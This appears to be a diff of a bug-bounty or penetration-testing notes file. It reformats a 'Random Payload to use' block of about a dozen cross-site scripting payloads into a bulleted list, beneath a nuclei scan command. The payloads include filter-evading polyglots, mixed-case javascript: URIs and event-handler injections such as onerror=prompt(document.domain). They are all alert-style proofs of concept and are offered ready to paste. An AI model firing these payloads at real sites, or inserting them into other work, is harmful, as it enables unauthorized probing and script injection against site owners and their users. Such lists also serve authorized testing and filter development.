@@ -230,41 +230,17 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 
 #### Random Payload to use: 
 ```bash
-<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
-
-<script src="data:,alert(1)%250A-->
-
-<script>alert(1)%0d%0a-->%09</script
-
-
-<x>%00%00%00%00%00%00%00<script>alert(1)</script>
-
-<script>location.href;'javascript:alert%281%29'</script>
-
-
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-
-
+• <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+• <script src="data:,alert(1)%250A-->
+• <script>alert(1)%0d%0a-->%09</script
+• <x>%00%00%00%00%00%00%00<script>alert(1)</script>
+• <script>location.href;'javascript:alert%281%29'</script>
+• jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 \');confirm(1);//
-
-
-<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
-
-
-<meter onmouseover="alert(1)"
-
-
-'">><div><meter onmouseover="alert(1)"</div>"
-
-
-
-<marquee loop=1 width=0 onfinish=alert(1)>
-
-
-
-
-
-
+• <img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+• <meter onmouseover="alert(1)"
+• '">><div><meter onmouseover="alert(1)"</div>"
+• <marquee loop=1 width=0 onfinish=alert(1)>
 ```
 
 - Bash One liners and More.
